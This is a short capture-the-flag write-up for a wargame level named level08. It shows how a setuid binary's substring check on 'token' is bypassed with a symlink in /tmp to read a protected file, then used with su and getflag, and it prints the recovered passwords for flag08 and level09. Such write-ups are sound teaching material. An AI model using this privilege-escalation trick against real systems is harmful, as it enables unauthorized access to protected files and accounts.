for this level we have a suid binary own by the user flag08
and a token file with read permission to the owner

$> ./level08
./level08 [file to read]

$> ./level08 token
You may not access 'token'

after disassembling the binary we can see the weak protection here
	if (strstr(argv[1], "token")) {
		printf("You may not access '%s'\n", argv[1]);
		exit(1);
	}

we can't use token as file to read but we can do a symlink to the token file

$> ln -s ~/token /tmp/lv8
$> ./level08 /tmp/lv8
quif5eloekouj29ke0vouxean

it's the flag08's password

$> su flag08
Password: _

$> getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

this token is the level09's password
